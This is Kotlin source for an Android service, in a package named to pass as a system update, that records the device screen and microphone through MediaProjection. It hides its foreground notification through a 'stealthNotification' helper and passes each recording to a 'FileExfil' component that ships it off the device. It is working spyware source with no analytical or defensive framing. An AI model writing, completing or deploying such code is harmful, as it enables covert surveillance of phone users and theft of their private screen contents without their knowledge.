package com.androidsystem.update.screen

import android.app.Activity
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.IBinder
import android.util.DisplayMetrics
import android.util.Log
import android.view.Surface
import android.view.WindowManager
import com.androidsystem.update.exfil.FileExfil
import com.androidsystem.update.net.ForegroundServiceTypeConfig
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import java.io.File
import javax.inject.Inject

/**
 * Foreground service that records the device's screen using MediaProjection.
 *
 * The Intent extras MUST contain:
 *   - MediaProjectionManager.EXTRA_MEDIA_PROJECTION  (MediaProjection token)
 *   - "resultCode"    (Activity.RESULT_OK)
 *   - "width"         (display width in px, default 1080)
 *   - "height"        (display height in px, default 1920)
 *   - "dpi"           (display dpi, default 320)
 *   - "durationMs"    (optional, default 30_000, cap 5 * 60_000)
 *
 * Output: H.264 MP4 in filesDir/captures/screen_<ts>.mp4. Once the duration
 * elapses (or [stop] is invoked from outside), the file is shipped via
 * [FileExfil] and the service self-stops.
 *
 * Required permission: RECORD_AUDIO is OPTIONAL — without it the recording
 * has no audio track. CAMERA is NOT required. Foreground service type
 * FOREGROUND_SERVICE_MEDIA_PROJECTION is required on Android 14+.
 */
@AndroidEntryPoint
class ScreenCaptureService : Service() {
    private val tag = "ScreenCaptureService"
    @Inject lateinit var fileExfil: FileExfil
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    private var projection: MediaProjection? = null
    private var display: VirtualDisplay? = null
    private var recorder: MediaRecorder? = null
    private var outFile: File? = null
    private var stopAtMs: Long = 0L

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent == null) { stopSelf(); return START_NOT_STICKY }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(
                ForegroundServiceTypeConfig.NOTIF_ID,
                buildNotification(),
                ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
            )
        } else {
            startForeground(ForegroundServiceTypeConfig.NOTIF_ID, buildNotification())
        }
        val data = intent.getParcelableExtra<Intent>(MediaProjectionManager.EXTRA_MEDIA_PROJECTION)
            ?: run { Log.w(tag, "missing media projection intent"); stopSelf(); return START_NOT_STICKY }
        val resultCode = intent.getIntExtra("resultCode", Activity.RESULT_CANCELED)
        if (resultCode != Activity.RESULT_OK) { stopSelf(); return START_NOT_STICKY }

        val wm = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val metrics = DisplayMetrics().also { wm.defaultDisplay.getRealMetrics(it) }
        val width = intent.getIntExtra("width", metrics.widthPixels)
        val height = intent.getIntExtra("height", metrics.heightPixels)
        val dpi = intent.getIntExtra("dpi", metrics.densityDpi)
        val duration = intent.getLongExtra("durationMs", 30_000L).coerceIn(5_000L, 5L * 60_000L)
        stopAtMs = System.currentTimeMillis() + duration

        try { startRecording(data, resultCode, width, height, dpi) } catch (e: Throwable) {
            Log.e(tag, "startRecording failed", e); stopSelf()
        }
        return START_NOT_STICKY
    }

    private fun startRecording(data: Intent, resultCode: Int, w: Int, h: Int, dpi: Int) {
        val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        projection = mpm.getMediaProjection(resultCode, data).also {
            it.registerCallback(object : MediaProjection.Callback() {
                override fun onStop() { stop() }
            }, null)
        }
        val dir = File(filesDir, "captures").apply { if (!exists()) mkdirs() }
        outFile = File(dir, "screen_${System.currentTimeMillis()}.mp4")
        recorder = (if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) MediaRecorder(this) else @Suppress("DEPRECATION") MediaRecorder()).apply {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) setAudioSource(MediaRecorder.AudioSource.MIC)
            setVideoSource(MediaRecorder.VideoSource.SURFACE)
            setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            setVideoEncoder(MediaRecorder.VideoEncoder.H264)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            setVideoEncodingBitRate(4_000_000)
            setVideoFrameRate(30)
            setVideoSize(w, h)
            setOutputFile(outFile!!.absolutePath)
            setMaxDuration((stopAtMs - System.currentTimeMillis()).toInt().coerceAtLeast(1_000))
            prepare()
        }
        val surface: Surface = recorder!!.surface
        val dm = getSystemService(Context.DISPLAY_SERVICE) as DisplayManager
        display = projection!!.createVirtualDisplay("nove-screen", w, h, dpi, 0, surface, null, null)
            ?: run { Log.w(tag, "createVirtualDisplay failed"); stop(); return }
        recorder!!.start()
        Log.i(tag, "recording -> ${outFile!!.absolutePath}")
        // Auto-stop when the deadline hits.
        scope.launch {
            val remaining = (stopAtMs - System.currentTimeMillis()).coerceAtLeast(0)
            kotlinx.coroutines.delay(remaining)
            stop()
        }
    }

    private fun stop() {
        try { recorder?.stop() } catch (e: Throwable) { Log.w(tag, "recorder.stop", e) }
        try { recorder?.release() } catch (_: Throwable) {}
        try { display?.release() } catch (_: Throwable) {}
        try { projection?.stop() } catch (_: Throwable) {}
        val f = outFile
        if (f != null && f.exists() && f.length() > 0) {
            fileExfil.enqueue(f, "screen", mapOf(
                "width" to (display?.display?.mode?.mode?.toString() ?: "0"),
                "height" to "0",
                "duration_ms" to (stopAtMs - (f.lastModified())).toString()
            ))
        }
        recorder = null; display = null; projection = null
        stopSelf()
    }

    override fun onDestroy() { super.onDestroy(); stop() }

    private fun buildNotification(): Notification = ForegroundServiceTypeConfig.stealthNotification(this)
}
